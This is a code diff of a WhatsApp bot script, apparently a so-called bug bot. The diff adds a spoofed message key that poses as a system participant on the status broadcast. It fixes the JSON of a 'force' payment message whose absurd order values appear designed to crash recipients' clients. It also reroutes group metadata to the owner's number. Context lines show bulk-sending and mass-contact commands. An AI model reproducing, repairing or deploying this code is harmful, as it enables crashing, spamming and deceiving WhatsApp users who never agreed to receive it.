@@ -455,6 +455,20 @@ async function sendVariousMessages(jid, count) {
   }
 }
 
+const statrp = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+message: {
+listResponseMessage: {
+title: `🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑`
+}
+}
+}
+	 
 const force = {
   key: {
     participant: `0@s.whatsapp.net`,
@@ -472,7 +486,7 @@ const force = {
         "buttons": [
           {
             "name": "review_and_pay",
-            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
       }
@@ -1787,7 +1801,7 @@ text: `𝑯𝒆𝒍𝒍𝒐 ${pushname}
  ➢ 𝐒𝐜𝐫𝐢𝐩𝐭 𝐦𝐚𝐧𝐭𝐚𝐢𝐧𝐚𝐧𝐜𝐞 𝐚𝐧𝐝 𝐦𝐚𝐝𝐞 𝐢𝐭 𝐚 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐛𝐨𝐭
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
  ⦁ 𝐋𝐨𝐫𝐝 𝐓𝐚𝐢𝐫𝐚 ⥈ 𝐍𝐢𝐠𝐞𝐫𝐢𝐚 🇳🇬
- ➢ 𝐀𝐝𝐝𝐞𝐝 𝐭𝐡𝐞 𝐦𝐞𝐧𝐮 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐭𝐨 𝐦𝐚𝐤𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐦𝐨𝐫𝐞 𝐟𝐚𝐧𝐜𝐲
+ ➢ Code Maintainer And Bug tester
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
  ⦁ 𝐄𝐦𝐩𝐨𝐫𝐨𝐫 𝐋𝐨𝐫𝐝
  ➢ 𝐅𝐨𝐫 𝐚𝐝𝐝𝐢𝐧𝐠 𝐠𝐢𝐭𝐡𝐮𝐛 𝐖𝐨𝐫𝐤𝐟𝐥𝐨𝐰 𝐟𝐨𝐫 𝐞𝐚𝐬𝐲 𝐝𝐞𝐩𝐥𝐨𝐲𝐦𝐞𝐧𝐭
@@ -1906,7 +1920,7 @@ zetsreply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *
 }
 break;
 //=================================================//
-case "cekidgc": {
+case "jid": case "cekjidgc": {
 await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*') 
 reply('Bentar Ya')
@@ -1917,7 +1931,8 @@ let teks = `➟ *List Grub Lu*\n\n💺Total Group : ${anu.length} Group\n\n`
 for (let x of anu) {
 let metadata2 = await zetsubo.groupMetadata(x)
 teks += `⿻ *INFO GROUP*\n┃➟ *NAMA :* ${metadata2.subject}\n┃➟ *ID :* ${metadata2.id}\n┃➟ *MEMBER :* ${metadata2.participants.length}\n╰────|⿻\n\n`
-            }reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
+            }
+await zetsubo.sendMessage(global.owner + `@s.whatsapp.net`, { text: teks }, { quoted: statrp})
 }
 break
 case 'pushkontak':{
